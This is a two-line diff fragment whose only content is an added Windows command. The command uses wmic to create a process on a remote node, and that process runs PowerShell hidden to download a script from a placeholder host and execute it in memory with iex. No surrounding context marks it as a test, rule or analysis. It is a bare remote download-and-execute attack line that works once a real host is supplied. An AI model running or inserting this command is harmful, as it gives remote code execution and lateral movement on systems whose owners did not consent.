@@ -1,0 +1,2 @@
+wmic /node:example.invalid process call create "powershell -w hidden -nop -c iex(New-Object Net.WebClient).DownloadString('http://example.invalid/a')"
+
